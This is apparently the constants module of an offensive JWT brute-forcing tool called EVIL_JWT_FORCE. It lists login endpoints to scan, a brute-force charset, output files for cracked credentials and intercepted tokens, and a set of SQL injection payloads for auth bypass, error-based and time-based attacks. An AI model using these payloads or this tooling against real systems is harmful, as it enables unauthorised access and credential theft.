"""
EVIL_JWT_FORCE Constants Module
Constantes globais utilizadas no projeto
"""

import os
from pathlib import Path

# Diretórios base
BASE_DIR = Path(__file__).resolve().parent.parent
CONFIG_DIR = BASE_DIR / "config"
OUTPUT_DIR = BASE_DIR / "output"
LOGS_DIR = BASE_DIR / "logs"
REPORTS_DIR = BASE_DIR / "reports"

# Configurações de JWT
JWT_ALGORITHMS = [
    'HS256', 'HS384', 'HS512',
    'RS256', 'RS384', 'RS512',
    'ES256', 'ES384', 'ES512',
    'PS256', 'PS384', 'PS512'
]

JWT_HEADER_TYPES = ['JWT', 'Bearer']

# Configurações de timeout e retry
DEFAULT_TIMEOUT = 30
MAX_RETRIES = 3
RETRY_DELAY = 5

# Headers padrão
DEFAULT_HEADERS = {
    'User-Agent': 'EVIL-JWT-FORCE/1.0',
    'Accept': 'application/json',
    'Content-Type': 'application/json'
}

# Arquivos de output
VALID_CREDS_FILE = OUTPUT_DIR / "valid_credentials.txt"
INVALID_CREDS_FILE = OUTPUT_DIR / "fail_credentials.txt"
INTERCEPTED_TOKENS_FILE = OUTPUT_DIR / "intercepted_tokens.txt"
FOUND_SECRETS_FILE = OUTPUT_DIR / "found_secrets.txt"

# Configurações de wordlist
MIN_PASSWORD_LENGTH = 4
MAX_PASSWORD_LENGTH = 32
DEFAULT_CHARSET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+'

# Configurações de logging
LOG_FORMAT = '[%(asctime)s] [%(levelname)s] %(message)s'
LOG_DATE_FORMAT = '%Y-%m-%d %H:%M:%S'
LOG_LEVELS = {
    'DEBUG': 10,
    'INFO': 20,
    'WARNING': 30,
    'ERROR': 40,
    'CRITICAL': 50
}

# Cores para output no terminal
COLORS = {
    'SUCCESS': '\033[92m',
    'WARNING': '\033[93m',
    'ERROR': '\033[91m',
    'INFO': '\033[94m',
    'RESET': '\033[0m'
}

# Endpoints comuns para varredura
COMMON_ENDPOINTS = [
    '/api/auth',
    '/api/login',
    '/auth/token',
    '/oauth/token',
    '/api/v1/auth',
    '/api/v2/auth',
    '/auth/jwt',
    '/login',
    '/admin/login',
    '/user/login'
]

# Payloads SQL comuns
SQL_PAYLOADS = {
    'auth_bypass': [
        "' OR '1'='1",
        "' OR 1=1--",
        "admin'--",
        "' OR '1'='1' #"
    ],
    'error_based': [
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND ERROR()--",
        "' AND 1=CONVERT(int,@@version)--"
    ],
    'time_based': [
        "' AND SLEEP(5)--",
        "' AND BENCHMARK(5000000,ENCODE('MSG','by 5 seconds'))--",
        "' WAITFOR DELAY '0:0:5'--"
    ]
}

# Status codes
HTTP_STATUS = {
    'OK': 200,
    'CREATED': 201,
    'ACCEPTED': 202,
    'NO_CONTENT': 204,
    'BAD_REQUEST': 400,
    'UNAUTHORIZED': 401,
    'FORBIDDEN': 403,
    'NOT_FOUND': 404,
    'SERVER_ERROR': 500
}